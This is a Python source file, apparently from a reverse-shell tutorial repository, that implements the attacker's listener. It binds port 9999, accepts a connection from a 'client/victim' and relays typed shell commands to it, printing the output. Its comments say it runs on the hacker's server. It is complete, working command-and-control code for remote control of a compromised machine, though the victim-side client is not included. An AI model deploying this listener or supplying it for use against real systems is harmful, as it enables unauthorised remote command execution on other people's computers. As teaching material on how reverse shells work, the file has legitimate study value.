##### Attrey Bhatt Codes - https://github.com/attreyabhatt/Reverse-Shell ###########
# If we are hacker then this file will go to our server that has a static ip address

#importing socket so that we can connect two computer
import socket
#imporing sys - used to implement command line and terminal commands into a python file.
import sys


######################################################################################################################
########## Function to Create a Socket ( socket connect two computers)
######################################################################################################################
def create_socket():
    try:
        #Creating following 3 global variables
        global host 
        global port
        global s         #This is socket variable which is named s

        #Assigning values to these 3 global variables 
        host = ""
        port = 9999
        s = socket.socket()    # Creating a socket and assigning it to s

    except socket.error as msg:
        print("Socket creation error: " + str(msg))


######################################################################################################################
########## # Binding the socket and listening for connections:
        # Before accepting connection we listen for connections after binding host and port with the socket
######################################################################################################################
def bind_socket():
    try:
        # Declaring them again so that we can use the above global variable
        global host
        global port
        global s
        print("Binding the Port: " + str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket()

######################################################################################################################
###########   Establish connection with a client (socket must be listening)
######################################################################################################################
def socket_accept():
    #s.accept retuens : conn: object of a conversation and address is a list of IP adress and a port
    conn, address = s.accept()
    print("Connection has been established! |" + " IP " + address[0] + " | Port" + str(address[1]))
    send_commands(conn) #A function defined below to send command to client
    conn.close() #whenever the connection has been establised, at the end we want to close the connection

######################################################################################################################
###########  # Send commands to client/victim or a friend
######################################################################################################################
def send_commands(conn):
    #creating an infinite while loop because if this isnt there then function will go back and will close the connection
    while True:
        cmd = input()     #Taking input from user if he wants to quit or continue this while loop
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        #When we send data from one computer to another it is not send in format of string but in format of bytes
        #Therefore we are encoding command prompt data "cmd" into the byte format    
        if len(str.encode(cmd)) > 0:
            #To send the command from our commuter to another computer we
            #use conn.send() function 
            conn.send(str.encode(cmd))
            #When we send something we also recieve  something back and storing it in client_response
            #We convert data from byte format to string format, 1024 is chunk
            client_response = str(conn.recv(1024),"utf-8")
            print(client_response, end="")

######################################################################################################################
###########  # MAIN 
######################################################################################################################
def main():
    create_socket()
    bind_socket()
    socket_accept()


main()







